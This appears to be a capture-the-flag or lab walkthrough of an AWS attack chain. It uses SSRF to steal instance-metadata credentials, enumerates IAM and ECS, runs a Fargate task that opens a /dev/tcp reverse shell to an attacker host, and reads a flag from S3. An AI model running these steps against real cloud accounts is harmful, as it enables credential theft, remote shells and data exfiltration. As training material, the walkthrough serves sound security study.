
Go to `http://<ec2_ip_address>`

`http://<ec2_ip_address>/?url=http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/<role>`

`aws configure --profile attacker`

`echo "aws_session_token = <token>" >> ~/.aws/credentials`

`aws --profile attacker sts get-caller-identity`

`aws --profile attacker iam get-role --role-name <role>`

`aws --profile attacker iam list-attached-role-policies --role-name <role>`

`aws --profile attacker iam list-role-policies --role-name <role>`

`aws --profile attacker iam get-role-policy --role-name <role> --policy-name <policy>`

`aws --profile attacker ecs list-clusters`

`aws --profile attacker ecs describe-clusters --clusters <cluster>`

`aws --profile attacker ecs list-container-instances --cluster arn:aws:ecs:us-east-1:<aws_id>:cluster/<cluster>`

`aws --profile attacker ecs describe-container-instances --cluster arn:aws:ecs:us-east-1:<user_id>:cluster/<cluster> --container-instances arn:aws:ecs:us-east-1:<aws-id>:container-instance/<cluster>/2d3ed51ad04847dd894dc78e263adfb3`

`aws --profile attacker ec2 describe-instances --instance-ids <instance-id>`

Attacker prepare revshell at other public ip point with `nc -lvp 4000`.

And now come back to CLI.

`aws --profile attacker ecs register-task-definition --family iam_exfiltration --task-role-arn arn:aws:iam::<userr_id>:role/<role> --network-mode "awsvpc" --cpu 256 --memory 512 --requires-compatibilities "[\"FARGATE\"]" --container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/<revshell_ip>/4000 0>&1\\\"\"]}]"`

`aws --profile attacker ec2 describe-subnets   `

`aws --profile attacker ecs run-task --task-definition iam_exfiltration --cluster arn:aws:ecs:us-east-1:<user_id>:cluster/<cluster> --launch-type FARGATE --network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"<subnet>\"]}}"`

After a few minutes, the revshell will be connected by container.
Let's do it on revshell.

`apt-get update`

`apt-get install awscli`

`aws s3 ls`

`aws s3 ls s3://<bucket-name>/`

`aws s3 ls s3://<bucket-name>/secret/`

`aws s3 cp s3://<bucket-name>/secret/flag.txt .`

`cat flag.txt`